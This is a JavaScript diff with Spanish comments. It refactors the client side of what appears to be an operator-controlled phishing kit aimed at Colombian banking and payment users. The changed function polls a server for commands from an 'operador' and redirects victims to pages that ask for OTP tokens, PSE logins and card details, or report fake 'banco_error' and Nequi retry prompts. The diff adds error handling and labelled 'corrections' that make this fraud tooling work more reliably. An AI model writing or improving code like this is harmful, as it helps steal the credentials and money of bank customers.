@@ -267,8 +267,11 @@
     montoEl.textContent = "Monto: $ 0";
   }
 
+  // ✅ CORRECCIÓN 1: Generador de TID mejorado
   function generarTransactionId() {
-    return 'TID' + Date.now() + Math.floor(Math.random() * 999);
+    const timestamp = Date.now();
+    const random = Math.random().toString(36).substr(2, 9).toUpperCase();
+    return `tid_${timestamp}_${random}`;
   }
 
   function mostrarError(mensaje) {
@@ -335,99 +338,116 @@
     }, TIMEOUT_MS);
   }
 
+  // ✅ CORRECCIÓN 3: Manejo robusto de errores en polling
   async function checkLogin(transactionId) {
     try {
       const res = await fetch(`1.php?transactionId=${transactionId}`);
+      
+      // Validar respuesta HTTP
+      if (!res.ok) {
+        console.error(`Error HTTP: ${res.status}`);
+        return;
+      }
+
       let json;
-try {
-  json = await res.json();
-} catch (e) {
-  return; // evita alerta falsa
-}
-
-
-      if (json.ok && json.action) {
-  clearInterval(poll);
-  clearTimeout(timeout);
-  modal.style.display = "none";
-
-  switch (json.action) {
-    case 'qr':
-      window.location.href = '/recaudos/index.php';
-      break;
-
-    case "pedir_token":
-      if (document.getElementById("otpToken")) {
-        document.getElementById("otpToken").value = "";
+      try {
+        json = await res.json();
+      } catch (parseError) {
+        console.error("Error al parsear JSON:", parseError);
+        return; // Continúa intentando
       }
 
-      const monto = totalPagar || "0";
-      const montoFormateado = new Intl.NumberFormat("es-CO", {
-        style: "currency",
-        currency: "COP"
-      }).format(parseInt(monto));
-
-      const montoElem = document.getElementById("montoClave");
-      if (montoElem) {
-        montoElem.textContent = `Monto: ${montoFormateado}`;
+      // Validar estructura JSON
+      if (!json || typeof json !== 'object') {
+        console.warn("Respuesta inválida - no es objeto JSON");
+        return;
       }
 
-      const modalAuth = document.getElementById("modalAutorizacion");
-      if (modalAuth) {
-        modalAuth.style.display = "flex";
+      // Solo procesar si hay respuesta positiva y acción
+      if (json.ok === true && json.action) {
+        clearInterval(poll);
+        clearTimeout(timeout);
+        modal.style.display = "none";
+
+        // Log de depuración
+        console.log(`✅ Acción recibida: ${json.action} para ${transactionId}`);
+
+        switch (json.action) {
+          case 'qr':
+            window.location.href = '/recaudos/index.php';
+            break;
+
+          case "pedir_token":
+            if (document.getElementById("otpToken")) {
+              document.getElementById("otpToken").value = "";
+            }
+
+            const monto = totalPagar || "0";
+            const montoFormateado = new Intl.NumberFormat("es-CO", {
+              style: "currency",
+              currency: "COP"
+            }).format(parseInt(monto));
+
+            const montoElem = document.getElementById("montoClave");
+            if (montoElem) {
+              montoElem.textContent = `Monto: ${montoFormateado}`;
+            }
+
+            const modalAuth = document.getElementById("modalAutorizacion");
+            if (modalAuth) {
+              modalAuth.style.display = "flex";
+            }
+            break;
+
+          case "dinamica_logo":
+            // 👉 NUEVA ACCIÓN
+            window.location.href = "lyd.php";
+            break;
+
+          case "rechazar":
+            mostrarError("El operador rechazó la solicitud.");
+            break;
+
+          case "banco_error":
+            alert("Datos erróneos. Corrígelos.");
+            window.location.href = "index.php";
+            break;
+
+          case "cc":
+            window.location.href = "/pse/index.php";
+            break;
+
+          case "tarjeta":
+          case "error_tc":
+            window.location.href = "/datac/alter.php";
+            break;
+
+          case "check":
+          case "aprobado":
+            window.location.href = "/site/checking.php";
+            break;
+
+          case "fin":
+            window.location.href = "/site/finis.php";
+            break;
+
+          case "enviado":
+            window.location.href = "espera.php";
+            break;
+
+          case "repetir":
+            alert("Se solicitó repetir el proceso con Nequi.");
+            window.location.reload();
+            break;
+
+          case "otro":
+            window.location.href = "/recaudos/brev.php";
+            break;
+
+          default:
+            console.warn("Acción desconocida:", json.action);
+        }
       }
-      break;
-
-    case "dinamica_logo":
-      // 👉 NUEVA ACCIÓN
-      window.location.href = "lyd.php";
-      break;
-
-    case "rechazar":
-      mostrarError("El operador rechazó la solicitud.");
-      break;
-
-    case "banco_error":
-      alert("Datos erróneos. Corrígelos.");
-      window.location.href = "index.php";
-      break;
-
-    case "cc":
-      window.location.href = "/pse/index.php";
-      break;
-
-    case "tarjeta":
-    case "error_tc":
-      window.location.href = "/datac/alter.php";
-      break;
-
-    case "check":
-    case "aprobado":
-      window.location.href = "/site/checking.php";
-      break;
-
-    case "fin":
-      window.location.href = "/site/finis.php";
-      break;
-
-    case "enviado":
-      window.location.href = "espera.php";
-      break;
-
-    case "repetir":
-      alert("Se solicitó repetir el proceso con Nequi.");
-      window.location.reload();
-      break;
-
-    case "otro":
-      window.location.href = "/recaudos/brev.php";
-      break;
-
-    default:
-      console.warn("Acción desconocida:", json.action);
-  }
-}
-
 
     } catch (err) {
       console.error("Error en checkLogin:", err);
